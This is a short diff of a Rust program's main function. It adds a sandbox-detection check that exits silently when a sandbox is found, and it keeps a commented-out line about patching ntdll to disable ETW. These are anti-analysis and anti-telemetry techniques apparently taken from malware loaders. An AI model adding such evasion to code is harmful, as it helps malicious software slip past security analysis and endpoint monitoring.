@@ -50,7 +50,9 @@ async fn main(){
         }
     };
 
-    //etw::__check_mouse_pointer();
+    if !detector::check_sandbox(){
+        std::process::exit(0);
+    };
     
     //new_ntdll_patch_etw().expect("Patching not okie");
     
